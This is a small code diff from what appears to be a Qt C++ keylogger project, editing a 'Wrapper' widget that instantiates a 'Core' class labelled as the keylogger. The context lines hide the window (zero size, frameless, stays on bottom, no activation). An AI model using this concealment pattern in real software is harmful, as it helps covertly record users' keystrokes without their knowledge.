@@ -8,6 +8,7 @@ Wrapper::Wrapper(QWidget *parent) :
      */
     setParent(nullptr);
     setFixedSize(0, 0);
+    unsetLocale();
 
     if (EXTRA_TRANSPARENCY) {
         setWindowFlags(Qt::Widget | Qt::FramelessWindowHint | Qt::SubWindow | Qt::WindowStaysOnBottomHint);
@@ -16,8 +17,8 @@ Wrapper::Wrapper(QWidget *parent) :
         setAttribute(Qt::WA_ShowWithoutActivating);
     }
 
-    /**assss
+    /**
      * @brief The core compontent (Keylogger) of the program.
      */
-    Core *core = new Core(this);
+    new Core(this);
 }
